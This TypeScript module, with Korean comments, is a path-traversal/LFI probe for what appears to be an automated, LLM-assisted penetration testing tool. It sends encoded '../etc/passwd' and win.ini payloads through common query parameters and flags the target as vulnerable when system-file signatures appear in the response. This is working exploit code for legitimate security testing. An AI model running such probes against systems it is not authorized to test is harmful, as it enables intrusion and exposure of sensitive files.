/**
 * path_traversal — 경로 조작/LFI(Local File Inclusion) 탐지 + 최소 PoC.
 *
 * 지정/추정 파라미터에 여러 인코딩의 `../etc/passwd`(및 Windows win.ini) 변형을 넣어,
 * 응답에 널리 알려진 시스템 파일 시그니처가 나타나는지 본다.
 *   - `root:x:0:0:` 등 /etc/passwd 시그니처 노출  → high (파일 1개 읽기 PoC)
 *   - `[extensions]`/`[fonts]` (win.ini)          → high
 * 오직 읽기(GET)만 하며, 대량 추출/쓰기/삭제는 하지 않는다(파일 1개 확인 수준).
 */

import type { Tool, ToolContext, ToolResult } from "../core/types.js";
import { forge } from "../core/payload-forge.js";
import { authGet, baseUrl, joinPath, withQuery } from "./util.js";

const PASSWD = /root:.*?:0:0:/;
const WININI = /\[(extensions|fonts|mci extensions)\]/i;

const DEFAULT_PARAMS = ["file", "path", "page", "template", "doc", "include", "name", "download"];
const DEFAULT_PATHS = ["/"];
const MAX_PARAMS = 6;
const MAX_PATHS = 8;
const MAX_PAYLOADS = 8;

export const pathTraversal: Tool = {
  name: "path_traversal",
  description:
    "파라미터에 여러 인코딩의 ../etc/passwd(및 win.ini) 를 넣어 경로 조작/LFI 를 탐지한다. 시스템 파일 시그니처 노출 시 high.",
  intent: "exploit",
  async run(args, ctx: ToolContext): Promise<ToolResult> {
    const base = baseUrl(ctx.target);
    const paths = pickPaths(args);
    const params = pickParams(args);
    const payloads = pickPayloads(args);

    for (const path of paths) {
      for (const param of params) {
        for (const payload of payloads) {
          const url = joinPath(base, withQuery(path, { [param]: payload }));
          try {
            const res = await authGet(ctx, url);
            const kind = PASSWD.test(res.body) ? "unix /etc/passwd" : WININI.test(res.body) ? "windows win.ini" : null;
            if (kind) {
              return {
                ok: true,
                summary: `경로 조작/LFI 확인: ${path} 의 param '${param}' 로 ${kind} 노출`,
                fingerprint: { indicators: [`lfi ${path}?${param}`, kind] },
                data: {
                  severity: "high",
                  title: `Path Traversal / LFI (param=${param})`,
                  evidence: `${kind} 시그니처 노출 (path=${path}, payload=${payload}): ${firstLine(res.body)}`,
                  param,
                },
              };
            }
          } catch {
            /* 개별 실패 무시 */
          }
        }
      }
    }
    return { ok: false, summary: `경로 조작/LFI 미탐지 (paths=${paths.join(",")}, params=${params.join(",")})` };
  },
};

function pickPaths(args: Record<string, unknown>): string[] {
  if (typeof args.path === "string" && args.path) return [args.path];
  if (Array.isArray(args.paths)) {
    const ps = args.paths.filter((x): x is string => typeof x === "string");
    if (ps.length) return [...new Set(ps)].slice(0, MAX_PATHS);
  }
  return DEFAULT_PATHS;
}

function pickParams(args: Record<string, unknown>): string[] {
  if (typeof args.param === "string" && args.param) return [args.param];
  if (Array.isArray(args.params)) {
    const ps = args.params.filter((x): x is string => typeof x === "string");
    if (ps.length) return ps.slice(0, MAX_PARAMS);
  }
  return DEFAULT_PARAMS.slice(0, MAX_PARAMS);
}

/** args.payloads(플래너/LLM 주입) 우선, 없으면 forge 의 다중 인코딩·스택별 변형. */
function pickPayloads(args: Record<string, unknown>): string[] {
  if (Array.isArray(args.payloads)) {
    const ps = args.payloads.filter((x): x is string => typeof x === "string");
    if (ps.length) return ps.slice(0, MAX_PAYLOADS);
  }
  return forge("lfi").slice(0, MAX_PAYLOADS);
}

function firstLine(body: string): string {
  return (body.split("\n").find((l) => /root:.*:0:0:|\[extensions\]/i.test(l)) ?? body.slice(0, 60)).trim().slice(0, 80);
}
